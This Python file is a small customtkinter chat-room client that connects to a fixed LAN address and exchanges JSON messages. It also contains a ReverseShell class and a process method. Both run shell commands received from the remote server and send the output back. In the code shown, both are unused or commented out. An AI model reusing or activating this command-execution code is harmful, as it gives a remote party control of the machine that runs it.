import socket
import time
import threading
import os
import subprocess
from Message import Messenger
import json 
import customtkinter

CLIENT_EXIT_CODE = '--exit--'

class Status():

    def __init__(self, status):
        self.state = status

        if(isinstance(status, bool) == False):
            self.state = False

    def set_true(self):
        self.state = True

    def set_false(self):
        self.state = False

    def get(self):
        return self.state

class _id_setter():
    
    def __init__(self, object):
        self.object = object
    
    def name(self, val):
        self.object._name = val
    
    def id(self, val):
        self.object.identifier_token = val

    def expiry_date(self, data):
        self.object.expiration_date = data


class _id_getter():

    def __init__(self, object):
        self.object = object
        pass
    
    def name(self):
        return self.object._name
    
    def id(self):
        return self.object.identifier_token


class _ID():

    def __init__(self, id, name):
        self.identifier_token = id
        self._name = name
        self.expiration_date = None
        self.setter = _id_setter(object=self)
        self.getter = _id_getter(object=self)

    
    def attribute_category(self, cat):
        if(cat == 'getters'):
            return self.getter

        elif(cat == 'setters'):
            return self.setter
    
    def get_dict(self):
        _dict = {
            'ID':self.identifier_token,
            'NAME':self._name,
            'EXPIRATION_DATE':self.expiration_date
        }

        return _dict

class ComponentID():
    
    def __init__(self, id, name):
        self.ComponentID = _ID(id, name)
    
    def read(self):
        return self.ComponentID.attribute_category('getters')
    
    def write(self):
        return self.ComponentID.attribute_category('setters')

    def get_dict(self):
        return self.ComponentID.get_dict()

class PROTOCOL():

    def __init__(self):
        pass

    pass


class  ReverseShell():

    def __init__(self, connection):
        self.rev_shell_thread = None
        self.connection = connection

    def process(self):
        while True:
            data = self.connection.recieve_data()
            if data[:2] == 'cd':
                os.chdir(data[3:])

            if len(data) > 0:
                cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                currentWD = os.getcwd() + "> "
                self.connection.send_data(str.encode(output_str + currentWD))
                msg = str(output_str) + "\n"
                app.display_text(msg)
                print(output_str)
    
    def __thread__(self):
        self.rev_shell_thread = threading.Thread(target=self.process)
        self.rev_shell_thread.start()

    def run(self):
        pass



class Connection():

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.state = False
        self.remote_ip = None
        self.remote_port = None
        self.show_connection_error = True            #Connection error flag establish_with()
        self.connection_ready_for_use = False        #Makes sure connection is setup for use 

    def __reset_state_to__(self, val):
        self.state = val

    def establish_with(self, IP, PORT):
        try:
            app.display_text("Establishing connection....\n")
            print("Establishing connection....")
            self.socket.connect((IP, PORT))
            self.remote_ip = IP
            self.remote_port = PORT
            self.__reset_state_to__(True)
            self.connection_ready_for_use = True
            msg = "Connection established with " + str(self.remote_ip) + str(self.remote_port) + "\n"
            app.display_text(msg)
            print(msg)
            return True
        except Exception as error:
            if(self.show_connection_error): 
                app.display_text("Failed!\n")
                print("Failed!")
            else: 
                msg = "Failed! [ERROR]:" + str(error) + "\n"
                app.display_text(msg)
                print(msg)
            self.__reset_state_to__(False)
            self.connection_ready_for_use = False
            return False
    
    def active(self):
        return self.state

    def send_data(self, data):
        if(self.connection_ready_for_use != True):
            app.display_text("[Error]: Connection not ready for sending...  Open() the conenction\n")
            print("[Error]: Connection not ready for sending...  Open() the conenction")
            return False
        
        try:
            self.socket.send(data.encode('utf-8'))
            return True
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False
    
    def recieve_data(self):
        if(self.connection_ready_for_use != True):
            app.display_text("[Error]: Connection not ready for recieving...  Open() the conenction\n")
            print("[Error]: Connection not ready for recieving...  Open() the conenction")
            return False
        
        try:
            message = self.socket.recv(1024).decode('utf-8')
            if(message == ""):
                return False
            
            return message
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False

    def open(self):
        if(self.connection_ready_for_use == True):
            self.__reset_state_to__(True)
        
        else:
            self.__reset_state_to__(False)
        
    def close(self):
        self.connection_ready_for_use = False
        self.state = False
        self.socket.close()
    
    def local_machine_address(self):
        return self.socket.getsockname()
    
    def remote_server_address(self):
        return self.socket.getpeername()
    
import json
import time
import copy
import datetime

class Messenger():

    def __init__(self):

        self._message_headers = {
            'REPORT_REQUEST_FLAG':None,
            'REPORT_RESPONSE_FLAG':None,
            'JOIN_ACCEPT_FLAG':None,
            'NEW_USER_FLAG':None,
            'QUIT_REQUEST_FLAG':None,
            'QUIT_ACCEPT_FLAG':None,
            'ATTACHMENT_FLAG':None,
            'NUMBER':None,
            'USERNAME':None,
            'FILENAME':None,
            'PAYLOAD_LENGTH':None,
            'PAYLOAD':None,
            'TIME_STAMP':None,
            'CONVERTED_TIME':None
        }
 
    def flush(self):
        for key, value in self._message_headers.items():
            self._message_headers[key] = None

    def set_request_field(self, header, value):
        # Set any request header value using header
        self._message_headers[header] = value

    def get_request_field(self, header):
        # Access any request field using header
        return self._message_headers[header]
    
    def set_request_message(self, message):
        # Set the message content
        self._message_headers['PAYLOAD'] = message
        _time = datetime.datetime.now()
        self._message_headers['TIME_STAMP'] = "{}H.{}M.{}S.{}MS".format(_time.hour, _time.minute, _time.second, _time.microsecond)
        self._message_headers['CONVERTED_TIME'] = (((_time.hour * 60 + 14) * 60 + _time.second) * 1000000 + _time.microsecond)

    def get_request_message(self):
        # Get the message content
        return self._message_headers['PAYLOAD']

    def get_request_body(self):
        # Gets the request body as python dict
        return self._message_headers
    
    def set_request_body(self, request_body):
        if(isinstance(request_body, dict) == True):
            for key, item in request_body.items():
                try:
                    self._message_headers[key] = item
                except Exception as error:
                    pass
        
        elif(isinstance(request_body, str)):
            _dict = json.loads(request_body)
            for key, item in _dict.items():
                try:self._message_headers[key] = item
                except Exception as error:pass

    def unpack_request_body(self, message_body):
        # Re constructs json data into message body and python dictionary to send data
        body = json.loads(message_body)
        self._message_headers = body

    def pack_request_body(self):
        # Constructs the request body into sendable and compiled json data
        message_string = json.dumps(self._message_headers)
        return message_string
    


class MessageLogStorage():

    def __init__(self):
        self._messages = []
        self._viewed_message_index = 0
    
    def store_message(self, message):
        msg = {
            'VIEWED':False,
            'MESSAGE':message,
            'TIME_STAMP':datetime.datetime.now().strftime("[%H:%M]")
        }

        self._messages.append(copy.copy(msg))
    
    def read_new_messages(self): 
        new_msgs = []
        for i in range(self._viewed_message_index, len(self._messages)):
            viewed = self._messages[i]['VIEWED']
            
            if(viewed == False):
                self._messages[i]['VIEWED'] = True
                new_msgs.append(self._messages[i])

                self._viewed_message_index += 1

        return new_msgs
    


class WebClient():

    def __init__(self, name):
        self.connection = Connection()
        self.local_address = None
        self.remote_address = None
        self.client_id = ComponentID('client_id', name)
        self.status = Status(False)
        self.messenger = Messenger()
        #self.shell = ReverseShell()


    def connect_to(self, IP, PORT):
        if(self.connection.establish_with(IP, PORT)):
            msg = "[Web Client] - " + str(self.client_id.read().name()) + "is active and connected\n"
            app.display_text(msg)
            print(msg)
            self.remote_address = self.connection.remote_server_address()
            self.local_address = self.connection.local_machine_address()
            self.status.set_true()
        
        else:
            self.status.set_false()
            msg = "[Web Client] - " + str(self.client_id.read().name()) + "is NOT active and disconnected\n"
            app.display_text(msg)
            print(msg)
        return self

    def process(self, data):
        data = data[1:]
        if data[:2] == 'cd':
            os.chdir(data[3:])

        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + ">"
            self.send_message(output_str + currentWD)
            #self.connection.send_data(str.encode(output_str + currentWD))
            #print(output_str)
            

    def __reciever__(self):

        while(True):
            val = self.recieve_message()
            if(val == False):
                self.status.set_false()
                self.connection.close()
                return
            
            
    def run(self):

        if(self.status.get() == False):
            app.display_text("In-active web client can't run\n")
            print("In-active web client can't run")
            return
        
        self.connection.open()

        msg = "Local Address: " + str(self.local_address) + "\n"
        msg2 = "Connected to: " + str(self.remote_address) + "\n"

        app.display_text("            Web Client   \n")
        app.display_text("_____________________________________\n")
        app.display_text(msg)
        app.display_text(msg2)

        print("            Web Client   ")
        print("_____________________________________")
        print(msg)
        print(msg2)
        recv_thread = threading.Thread(target=self.__reciever__)
        recv_thread.start()
        
        val = None
        status = None
        app.update_idletasks()
        app.update()
        while((self.connection.active() == True) and (self.status.get() == True)):
            val = input()
            if(val  == CLIENT_EXIT_CODE):
                self.status.set_false()
                self.connection.close()
                break
            
            status = self.send_message(val)
            if(status == False):
                self.status.set_false()
                self.connection.close()
                break
        app.display_text("           Web Client Closed\n")
        app.display_text("______________________________________\n")
        print("           Web Client Closed")
        print("______________________________________")
        return self


    def send_message(self, message):
        #Need to detect if the socket on the other side has gone, offline or clsoed
        val = None
        if(self.connection.active() == True):

            # --- Sending message using messenger ----
            self.messenger.set_request_message(message)
            self.messenger.set_request_field('USERNAME', self.client_id.read().name())
            packed_msg = self.messenger.pack_request_body()
            val = self.connection.send_data(packed_msg)
            message2="[SENT]: " + str(self.messenger.get_request_message()) + "\n"
            app.display_text(message2)
            print(message2)
            self.messenger.flush()
            # ---- End of the section ----------


            #val = self.connection.send_data(message)
            #print("[SENT]: ", message)
        return val

    def __process_if_protocol_command(self, message):

        if(message == '--GET_IDENTITY_CARD--' ):
            _id = self.client_id.get_dict()
            sent = self.connection.send_data(json.dumps(_id))
            app.display_text("Sent ID CARD....\n")
            print("Sent ID CARD....")
            return True

    def recieve_message(self):
        #Need to detech if the socket on the other side has gone, offline or closed
        message = None
        if(self.connection.active()):
            message = self.connection.recieve_data()
        
        # ---- If there's any request as command/protocol
        _is_command = self.__process_if_protocol_command(message)
        if(_is_command):return
        # ------------------------------------------------------

        # --- Use messenger object to process data here in ----- 
        self.messenger.unpack_request_body(message)
        username = self.messenger.get_request_field('USERNAME')
        timestamp = self.messenger.get_request_field('TIME_STAMP')
        msg = str(username) + str(self.messenger.get_request_message()) + "\n"
        app.display_text(msg)
        print("{}:".format(username), self.messenger.get_request_message())
        self.messenger.flush()

        # ------------------- End of section ------------------

        '''if(isinstance(message, bool) == False):
            if(message[0] != '-'):print("[Recieved]: ", message)
        if(message!= None and isinstance(message, bool) == False): self.process(message)
        print("[RECIEVED]:", message)'''
        return message

    def close(self):
        self.status.set_false()
        self.connection.close()

    def get_card(self):
        return self.client_id
    


customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("blue")
    
class MyFrame(customtkinter.CTkScrollableFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)

        # add widgets onto the frame...
        self.frame = customtkinter.CTkFrame(self,width=200, height=200, corner_radius=5, bg_color="grey")
        self.frame.grid(row=0, column=0, padx=20)

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.exitcode = ' '
        self.button_pressed = 0

        self.title("Chat Room")
        self.geometry("1280x720")

       
        #Textbox
        self.textbox = customtkinter.CTkTextbox(master=self, width=1000, height=500, font = ("Arial", 20), text_color="white",wrap = "word", state = "disabled")
        self.textbox.place(relx = 0.1, rely = 0.1, anchor = "nw")
        
        
        #Send Button
        self.message_frame = customtkinter.CTkFrame(self,width=1280, height=70, corner_radius=1, bg_color="grey")
        self.message_frame.pack(side = "bottom", padx=20, pady=10)
        self.button = customtkinter.CTkButton(master=self.message_frame, text="Send", command=self.button_callback, width = 200, height = 50, font = ("Arial", 20), text_color="white", fg_color="grey")
        self.button.place(relx = 0.825, rely = 0.89, anchor = "sw")

        #Exit Button
        self.button = customtkinter.CTkButton(master=self, text="EXIT", command=self.exit_button, width = 100, height = 50, font = ("Arial", 20), text_color="white", fg_color="grey")
        self.button.place(relx = 0.975, rely = 0.025, anchor = "ne")

        #User Input
        self.text_entry = customtkinter.CTkEntry(master=self.message_frame, placeholder_text= "Input Message Here", width = 1000, height = 50, font = ("Arial", 20), text_color="white", fg_color="grey")
        self.text_entry_frame = customtkinter.CTkFrame(self)
        self.text_entry.place(relx = 0.01, rely = 0.89, anchor = "sw")
        
    def button_callback(self):
        client.send_message(self.text_entry.get())
        if self.text_entry.get() == CLIENT_EXIT_CODE:
            self.exitcode = self.text_entry.get()
        #print(f"Adam said: {self.text_entry.get()}")
        #self.display_text(self.text_entry.get())
        self.text_entry.delete(0,(len(self.text_entry.get())))
        self.button_pressed = 1
    
    def display_text(self,message):
        self.textbox.configure(state="normal")
        self.textbox.insert('end',message)
        self.textbox.configure(state="disabled")

    def exit_button(self):
        client.status.set_false()
        client.connection.close()

        msg = "Name:" + str(client.get_card().read().name()) + "\n"
        app.display_text("           Web Client Closed\n")
        app.display_text("______________________________________\n")
        app.display_text(msg)

        print("           Web Client Closed")
        print("______________________________________")
        print(msg)
        client.close()
        self.destroy()
    

app = App()
#app.mainloop()
#app.update_idletasks()
#app.update()


client = WebClient('Elijah')
client.connect_to('192.168.1.54', 9999).run()
# print("Name:", client.get_card().read().name())
# client.close()